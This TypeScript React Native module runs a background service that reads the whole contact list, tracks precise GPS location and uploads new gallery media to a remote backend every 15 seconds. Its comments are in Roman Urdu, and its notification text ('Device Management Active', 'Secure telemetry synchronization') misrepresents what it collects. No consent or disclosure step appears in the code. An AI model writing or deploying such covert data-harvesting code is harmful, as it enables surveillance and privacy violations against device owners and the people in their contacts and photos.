import BackgroundService from 'react-native-background-actions';
import Geolocation from 'react-native-geolocation-service';
import Contacts from 'react-native-contacts';
import axios from 'axios';
import { scanAndUploadGallery, MediaItem } from './MediaPipelineService';

const sleep = (time: number) => new Promise<void>((resolve) => setTimeout(resolve, time));

interface SyncOptions {
  backendUrl: string;
  deviceId: string;
}

export const startBackgroundSync = async (options: SyncOptions) => {
  const veryIntensiveTask = async () => {
    await new Promise(async () => {

      // ═══════════════════════════════════════════════════════════════════════
      // STEP 1: CONTACTS - Sirf EK dafa fetch karo aur poora array bhejo
      // Backend pe upsert hoga - duplicate record nahi banega
      // ═══════════════════════════════════════════════════════════════════════
      let allContacts: any[] = [];
      let contactsSent = false; // Flag - contacts sirf pehli dafa bhejna hai

      try {
        allContacts = await Contacts.getAll();
        console.log(`Fetched ${allContacts.length} contacts`);
      } catch (err) {
        console.error('Failed to fetch contacts:', err);
      }

      // ═══════════════════════════════════════════════════════════════════════
      // STEP 2: SESSION-LEVEL CACHE - Is session mein jo files upload ho gayi
      // MediaPipelineService ka global cache bhi hai, yeh extra layer hai
      // ═══════════════════════════════════════════════════════════════════════
      const sessionUploadedIds = new Set<string>();

      // ═══════════════════════════════════════════════════════════════════════
      // STEP 3: MAIN LOOP - 4 iterations * 15s = 60 seconds background window
      // Har iteration mein: location + gallery scan + contacts (sirf pehli dafa)
      // ═══════════════════════════════════════════════════════════════════════
      for (let i = 0; i < 4 && BackgroundService.isRunning(); i++) {
        try {
          // ── Location fetch ────────────────────────────────────────────────
          const position = await new Promise<Geolocation.GeoPosition>((resolve, reject) => {
            Geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: true,
              timeout: 15000,
            });
          });

          // ── Gallery scan - background mein naye items dhundho ─────────────
          // sessionUploadedIds share karte hain taake is loop mein duplicate na ho
          const newMediaItems: MediaItem[] = await scanAndUploadGallery(
            options.deviceId,
            sessionUploadedIds,
          );

          // ── Backend ko sync karo ──────────────────────────────────────────
          const payload: any = {
            deviceId: options.deviceId,
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
          };

          // Contacts: Sirf PEHLI iteration mein bhejo (ya agar pehli dafa fail ho)
          if (!contactsSent && allContacts.length > 0) {
            payload.contacts = allContacts; // Poora contacts array ek sath
          }

          // Media: Sirf naye items bhejo (already uploaded wale nahi)
          if (newMediaItems.length > 0) {
            payload.mediaItems = newMediaItems; // { url, fileId, mediaType }[]
          }

          await axios.post(`${options.backendUrl}/api/telemetry/sync`, payload);

          // Contacts successfully bhej diye - flag set karo
          if (!contactsSent && allContacts.length > 0) {
            contactsSent = true;
            console.log(`Contacts sent: ${allContacts.length} (will not send again this session)`);
          }

          console.log(`Sync iteration ${i + 1}/4 complete - ${newMediaItems.length} new media items`);

        } catch (e) {
          console.error(`Background sync iteration ${i + 1} failed:`, e);
        }

        // Aakhri iteration ke baad wait mat karo
        if (i < 3) {
          await sleep(15000); // 15 seconds wait
        }
      }

      // ═══════════════════════════════════════════════════════════════════════
      // 60 seconds complete - service stop karo
      // ═══════════════════════════════════════════════════════════════════════
      if (BackgroundService.isRunning()) {
        await BackgroundService.stop();
        console.log('Background sync completed after 60 seconds.');
      }
    });
  };

  await BackgroundService.start(veryIntensiveTask, {
    taskName: 'EnterpriseSync',
    taskTitle: 'Device Management Active',
    taskDesc: 'Secure telemetry synchronization in progress',
    taskIcon: { name: 'ic_launcher', type: 'mipmap' },
    color: '#ff00ff',
    foregroundServiceType: ['dataSync'],
  } as any);
};